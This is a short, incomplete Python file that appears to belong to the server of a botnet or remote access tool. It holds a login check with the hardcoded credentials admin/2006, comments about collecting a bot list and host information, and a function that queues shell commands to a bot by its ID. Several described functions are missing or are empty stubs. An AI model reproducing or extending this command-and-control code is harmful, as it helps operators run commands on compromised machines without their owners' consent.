from server.model import Model,Command,CommandType
from server.handler import _RequestHandler
from server import modules
from server.modules.helper import ModuleABC
from server.view.webgui import webgui


model=Model()
rhandler = _RequestHandler(model)
web = webgui(model)


def login(username,password):
    creds = ["admin","2006"]
    if username == creds[0] and password == creds[1]:
        return True
    else:
        return False

#Gets information about cookies for ex hostname system version etc more things and sends it to database

#Gets the bot list from database and sends to web ui


#Gets command from web ui and sends to database
def get_command_type_shell(command,bot_uid):
    model.add_command(bot_uid,Command(CommandType.SHELL, command.encode()))

#Gets all the modules
def getallmodules():
    for i in range(3):
        pass
